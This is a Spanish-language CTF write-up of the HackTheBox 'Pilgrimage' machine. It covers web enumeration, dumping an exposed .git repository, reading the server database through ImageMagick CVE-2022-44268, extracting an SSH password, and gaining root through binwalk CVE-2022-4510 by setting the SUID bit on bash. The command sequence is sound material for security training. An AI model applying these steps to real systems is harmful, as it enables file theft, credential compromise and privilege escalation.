+++ 
draft = false
date = 2025-11-29T23:36:29Z
title = "Pilgrimage Machine - HackTheBox"
description = "Esta es una máquina Linux de nivel Easy de la plataforma HackTheBox"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-----------------------------
- Tags: #Linux #Magick #Binwalk #github 
----------------
# Enumeración Nmap
**Comando:**

```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.219 -oG allPorts
```
En el escaneo vemos el dominio `pilgrimage.htb`

<img src="/images/Pasted image 20251103181357.png" style="width:100%; height:auto; display:block; margin:auto;">

Procederemos a agregarlo a nuestro `/etc/hosts`

<img src="/images/Pasted image 20251103181502.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración HTTP puerto 80

Viendo la página web, vemos que podemos subir archivos, al parecer imagenes y que estas se editan

<img src="/images/Pasted image 20251103181756.png" style="width:100%; height:auto; display:block; margin:auto;">

Nos registraremos con las credenciales `rkx:rkx` y al loguearnos nos lleva al `dashboard.php`

<img src="/images/Pasted image 20251103181902.png" style="width:100%; height:auto; display:block; margin:auto;">

Revisando la web, no encontramos nada interesante, por tanto seguimos enumerando directorios con `fuzz` con el siguiente comando

```bash
ffuf -u http://pilgrimage.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -fs 7621
```

# Enumeración Github
#github

Y encontramos el directorio `.git` de github

<img src="/images/Pasted image 20251103214438.png" style="width:100%; height:auto; display:block; margin:auto;">

Para enumerar github descargaremos el siguiente recurso de github

`https://github.com/arthaud/git-dumper`

```bash
git clone https://github.com/arthaud/git-dumper
```

## Entorno virtual en python

Se crea un entorno virtual para no instalar librerías innecesarias que pueden generar conflictos en nuestro sistema

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Usamos git-dumper de la siguiente forma

```bash
python3 git_dumper.py http://pilgrimage.htb/.git git
```

para salir del entorno virtual usar

```bash
deactivate
```

Haciendo un tree al recurso que descargamos con git-dumper tenemos lo siguiente

<img src="/images/Pasted image 20251103221052.png" style="width:100%; height:auto; display:block; margin:auto;">

Vemos que se está usando `magick` para hacer la transformación de la imagen, con la bandera `-version` vemos la versión

<img src="/images/Pasted image 20251103221203.png" style="width:100%; height:auto; display:block; margin:auto;">

Además si vemos el archivo `login.php`, nos muestra la ruta que alberga la base de datos sqlite, en este caso `/var/db/pilgrimage`

<img src="/images/Pasted image 20251103222027.png" style="width:100%; height:auto; display:block; margin:auto;">

# Explotando ImageMagick 7.1.0-49

Buscando por vulnerabilidades a la versión de magick encontramos un information disclosure.

La vulnerabilidad consiste en insertar una ruta en los metadatos de una imagen con extensión .png, luego al subir la imagen y tratarse con `ImageMagick 7.1.0-49` podemos descargar el archivo tratado, y al usar `exiv2` leer la ruta en hexadecimal.

<img src="/images/Pasted image 20251103221500.png" style="width:100%; height:auto; display:block; margin:auto;">

Buscando por un PoC para la CVE-2022-44268, encontramos el siguiente PoC en github

<img src="/images/Pasted image 20251103221543.png" style="width:100%; height:auto; display:block; margin:auto;">

## Dependencias

Necesitamos tener `pngcrush`, `exiftool` y `exiv2`

## Creación de Png Malicioso

Primeramente descargar un archivo .png cualquiera

```bash
wget https://w7.pngwing.com/pngs/151/483/png-transparent-brown-tabby-cat-cat-dog-kitten-pet-sitting-the-waving-cat-animals-cat-like-mammal-pet-thumbnail.png
```

Renombramos el archivo por comodidad a `gato.png`

```bash
mv png-transparent-brown-tabby-cat-cat-dog-kitten-pet-sitting-the-waving-cat-animals-cat-like-mammal-pet-thumbnail.png gato.png
```

Creamos el archivo `pngout.png` malicioso

```bash
pngcrush -text a "profile" "/var/db/pilgrimage" gato.png
```

## Verificamos el archivo malicioso

Para verificar si creamos bien el archivo malicioso usamos

```bash
exiv2 -pS pngout.png
```

y tenemos lo siguiente

<img src="/images/Pasted image 20251103222516.png" style="width:100%; height:auto; display:block; margin:auto;">

## Subimos el archivo malicioso a la web

<img src="/images/Pasted image 20251103222553.png" style="width:100%; height:auto; display:block; margin:auto;">

Descargamos la imagen una vez convertida

<img src="/images/Pasted image 20251103222612.png" style="width:100%; height:auto; display:block; margin:auto;">

## Leemos el contenido

Para leer el contenido usamos el siguiente comando, recordar que el output es en hexadecimal

```bash
identify -verbose 69095618b889b.png
```

El contenido que nos muestra es bastante largo, ya que es una base de datos

<img src="/images/Pasted image 20251103222801.png" style="width:100%; height:auto; display:block; margin:auto;">

A nosotros lo que nos interesa es el contenido que está en `Raw profile type:`, por tanto filtraremos por la primera línea completa de la siguiente forma:

<img src="/images/Pasted image 20251103222911.png" style="width:100%; height:auto; display:block; margin:auto;">

Luego para ver las demás lineas de abajo tenemos la flag `-A [número]`

con -A 570 tenemos lo siguiente

<img src="/images/Pasted image 20251103223031.png" style="width:100%; height:auto; display:block; margin:auto;">

y con -A 569 muestra lo siguiente

<img src="/images/Pasted image 20251103223056.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto utilizaremos -A 569 para tomar todo el contenido

```bash
identify -verbose 69095618b889b.png | grep -A 569 "53514c69" > hex.txt
```

## Transformar el contenido

Para transformar desde hexadecimal a texto legible usaremos `xxd`

```bash
xxd -r -p hex.txt > database.db
```

Teniendo lo siguiente

<img src="/images/Pasted image 20251103223349.png" style="width:100%; height:auto; display:block; margin:auto;">

# Extrayendo credenciales desde database

Teniendo la base de datos que obtuvimos gracias a la vulnerabilidad la procedemos a leer con `sqlite3`

```bash
sqlite3 database.db
.tables
select * from users;
```

y obtenemos las siguientes credenciales: `emily|abigchonkyboi123`

<img src="/images/Pasted image 20251103223558.png" style="width:100%; height:auto; display:block; margin:auto;">

# Escalada de privilegios

Nos conectamos por `ssh` con las credenciales obtenidas, y leemos la flag de `user.txt`

<img src="/images/Pasted image 20251103223700.png" style="width:100%; height:auto; display:block; margin:auto;">

Buscando por los procesos que se ejecutan en la máquina víctima con `ps -aux` encontramos el siguiente script `/usr/sbin/malwarescan.sh` que lo ejecuta root

<img src="/images/Pasted image 20251103230938.png" style="width:100%; height:auto; display:block; margin:auto;">

Viendo el script en cuestión tenemos que ejecuta `inotifywait` en la ruta `/var/www/pilgrimage.htb/shrunk` y luego utiliza `binwalk`

<img src="/images/Pasted image 20251103231027.png" style="width:100%; height:auto; display:block; margin:auto;">

Buscando vulnerabilidades de las herramientas que se utilizan encontramos la siguiente de `binwalk`

<img src="/images/Pasted image 20251103231235.png" style="width:100%; height:auto; display:block; margin:auto;">

Buscando específicamente por el `CVE-2022-4510` encontramos el siguiente script en github `https://github.com/adhikara13/CVE-2022-4510-WalkingPath`

<img src="/images/Pasted image 20251103231330.png" style="width:100%; height:auto; display:block; margin:auto;">

## Explotar vulnerabilidad

Para explotar la vulnerabilidad debemos pasar el script descargado y una imagen png a la máquina víctima

Una vez descargadas las almacenamos en la carpeta que está analizando binwalk, en este caso `/var/www/pilgrimage.htb/shrunk`

<img src="/images/Pasted image 20251103231508.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora corremos el script de la siguiente forma:

```bash
python3 walkingpath.py command --command "chmod u+s /usr/bin/bash" gato.png
```

Y lo que hará es dar permiso SUUID a la bash

<img src="/images/Pasted image 20251103231616.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora con `bash -p` accedemos a los privilegios de root y podemos leer la flag de `root.txt`

<img src="/images/Pasted image 20251103231659.png" style="width:100%; height:auto; display:block; margin:auto;">
